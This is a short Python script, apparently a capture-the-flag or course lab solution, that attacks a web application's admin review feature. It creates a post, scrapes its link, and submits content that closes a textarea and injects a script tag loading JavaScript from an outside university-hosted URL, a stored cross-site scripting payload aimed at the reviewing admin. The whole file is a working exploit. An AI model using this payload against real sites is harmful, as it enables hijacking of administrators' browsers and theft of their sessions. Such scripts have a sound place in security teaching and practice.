import requests
import random
import string
import re

link = "http://mustard.stt.rnl.tecnico.ulisboa.pt:22254"
file_url = "http://web.tecnico.ulisboa.pt/ist195581/script.js"

s = requests.Session()

data = { 'title' : ''.join(random.choices(string.ascii_lowercase, k = 5)), 'content' : 'a' }
post_link = re.findall('value=".*"', s.post(link + "/submit_post_for_review", data = data).text)[0][7:-1]
data = { 'link' : post_link, 'content' : '</textarea><script src="' +  file_url + '"></script>' }
s.post(link + "/submit_for_admin_review", data = data)